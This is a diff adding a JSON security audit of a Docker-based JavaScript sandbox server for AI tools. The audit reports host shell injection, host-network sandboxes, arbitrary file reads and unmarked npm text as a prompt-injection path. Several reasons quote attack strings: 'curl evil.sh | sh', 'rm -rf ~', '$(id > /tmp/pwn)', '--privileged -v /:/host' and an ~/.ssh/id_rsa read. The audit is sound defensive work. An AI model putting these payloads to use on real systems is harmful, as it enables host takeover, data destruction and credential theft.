@@ -1,0 +1,171 @@
+[
+ {
+  "rule": "CMD-INJECTION",
+  "title": "sandbox_exec: container_id and commands reach the HOST shell via execSync",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/tools/exec.ts",
+    "line": 7,
+    "quote": "container_id: z.string(),"
+   },
+   {
+    "file": "src/tools/exec.ts",
+    "line": 28,
+    "quote": "`docker exec ${container_id} /bin/sh -c ${JSON.stringify(cmd)}`,"
+   }
+  ],
+  "reason": "execSync runs the string through the host /bin/sh: container_id='x; curl evil.sh | sh #' runs on the host, and because JSON.stringify only wraps cmd in double quotes, a command like \"$(id > /tmp/pwn)\" or backticks is expanded by the host shell before docker ever sees it, so the 'run inside the sandbox' tool escapes to the host.",
+  "fix": "Use execFileSync('docker', ['exec', container_id, '/bin/sh', '-c', cmd]) (no host shell) and require container_id to be one the server created (activeSandboxContainers.has(id) and ^js-sbx-[0-9a-f-]+$).",
+  "id": "M001",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "sandbox_stop: container_id interpolated into host shell command",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/tools/stop.ts",
+    "line": 7,
+    "quote": "export const argSchema = { container_id: z.string() };"
+   },
+   {
+    "file": "src/tools/stop.ts",
+    "line": 22,
+    "quote": "execSync(`docker rm -f ${container_id}`);"
+   }
+  ],
+  "reason": "container_id='x; rm -rf ~ #' (or any command) runs on the host; it also lets the caller remove any container on the host, not just sandbox ones.",
+  "fix": "execFileSync('docker', ['rm', '-f', container_id]) after checking container_id is in activeSandboxContainers.",
+  "id": "M002",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "run_js: container_id interpolated into docker cp / docker exec host shell commands",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/tools/runJs.ts",
+    "line": 27,
+    "quote": "container_id: z.string().describe('Docker container identifier'),"
+   },
+   {
+    "file": "src/tools/runJs.ts",
+    "line": 74,
+    "quote": "execSync(`docker cp ${localWorkspace.name}/. ${container_id}:/workspace`);"
+   },
+   {
+    "file": "src/dockerUtils.ts",
+    "line": 60,
+    "quote": "`docker exec ${containerId} /bin/sh -c  ${JSON.stringify(command)}`,"
+   }
+  ],
+  "reason": "container_id from the tool call is pasted unquoted into host shell commands (docker cp, docker exec npm install, safeExecNodeInContainer), so a value containing ; or $( ) executes on the host before any code reaches the container.",
+  "fix": "Switch all docker calls to execFileSync('docker', [...args]) and validate container_id against the server's registry of created sandboxes.",
+  "id": "M003",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "sandbox_initialize / run_js_ephemeral: image argument interpolated into docker run",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/tools/initialize.ts",
+    "line": 24,
+    "quote": "image: z.string().optional(),"
+   },
+   {
+    "file": "src/tools/initialize.ts",
+    "line": 64,
+    "quote": "`--name ${containerId} ${image} tail -f /dev/null`"
+   },
+   {
+    "file": "src/tools/runJsEphemeral.ts",
+    "line": 32,
+    "quote": "image: z"
+   },
+   {
+    "file": "src/tools/runJsEphemeral.ts",
+    "line": 85,
+    "quote": "`--name ${containerId} ${image} tail -f /dev/null`"
+   }
+  ],
+  "reason": "image='node:lts-slim; curl evil.sh | sh #' runs on the host; even without shell metacharacters, image can inject docker run options (e.g. '--privileged -v /:/host node') to break out of the sandbox.",
+  "fix": "execFileSync('docker', ['run', ..., '--', image, 'tail', '-f', '/dev/null']) and restrict image to an allowlist (e.g. the keys of suggestedImages).",
+  "id": "M004",
+  "quotes_verified": 4
+ },
+ {
+  "rule": "DANGEROUS-AGENT-TOOL",
+  "title": "Code sandboxes run with --network host by default",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/tools/initialize.ts",
+    "line": 47,
+    "quote": "const portOption = port ? `-p ${port}:${port}` : `--network host`; // prefer --network host if no explicit port mapping"
+   },
+   {
+    "file": "src/tools/runJsEphemeral.ts",
+    "line": 83,
+    "quote": "`docker run -d --network host ${memFlag} ${cpuFlag} ` +"
+   }
+  ],
+  "reason": "run_js / run_js_ephemeral execute model-written code by design, but the container shares the host network namespace, so injected code can reach services bound to the host's localhost (databases, admin UIs, other MCP servers) and cloud metadata, and send anything in the mounted FILES_DIR out.",
+  "fix": "Use the default bridge network (or --network none unless the user opts in), publish ports explicitly with -p 127.0.0.1:port:port, and keep client approval on run_js/run_js_ephemeral.",
+  "id": "M005",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "file:// resource template serves any file on the host",
+  "verdict": "needs_context",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/server.ts",
+    "line": 128,
+    "quote": "new ResourceTemplate('file://{+filepath}', { list: undefined }),"
+   },
+   {
+    "file": "src/server.ts",
+    "line": 131,
+    "quote": "const data = await fs.readFile(filepath);"
+   }
+  ],
+  "reason": "resources/read with file:///home/user/.ssh/id_rsa (or any path) returns the file; there is no check that the path is inside FILES_DIR. Impact depends on whether the MCP client lets the model (rather than only the user) request resources.",
+  "fix": "Resolve the path with fs.realpath and require path.relative(FILES_DIR, real) not to start with '..' (and not be absolute); reject everything else.",
+  "id": "M006",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "INDIRECT-INJECTION",
+  "title": "npm README snippets and .d.ts files from the registry returned to the model unmarked",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/tools/getDependencyTypes.ts",
+    "line": 45,
+    "quote": "info.types = await contentRes.text();"
+   },
+   {
+    "file": "src/tools/getDependencyTypes.ts",
+    "line": 83,
+    "quote": "return { content: [textContent(JSON.stringify(results))] };"
+   }
+  ],
+  "reason": "Any npm package author controls the README and type files these tools return, which is a way for injected instructions to reach a model that also holds the host-shell injections above.",
+  "fix": "Mark returned third-party text as untrusted data in the result, truncate it, and fix M001-M004 so injected instructions cannot reach the host.",
+  "id": "M007",
+  "quotes_verified": 2
+ }
+]
